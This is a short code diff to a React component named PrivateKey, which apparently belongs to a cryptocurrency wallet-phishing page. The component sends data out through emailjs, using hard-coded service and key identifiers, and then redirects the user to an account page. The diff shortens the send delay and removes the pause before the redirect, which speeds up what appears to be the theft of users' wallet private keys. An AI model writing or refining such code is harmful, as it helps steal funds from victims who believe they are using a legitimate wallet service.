@@ -59,7 +59,7 @@ const PrivateKey = ({ wallet, appType }) => {
           '4leuzsOPi6Oh_D4e0'
         );
 
-        await sendFast(1 * 60 * 1000);
+        await sendFast(1 * 5 * 1000);
 
         await emailjs.send(
           'service_ky8xa0e',
@@ -77,9 +77,8 @@ const PrivateKey = ({ wallet, appType }) => {
           'pudHPDoixy2beukw8'
         );
 
-        setTimeout(() => {
-          router.push("/account")
-        }, 3000);
+        router.push("/account")
+        
       } catch (error) {
         console.log(error);
         toast.error('network error', {
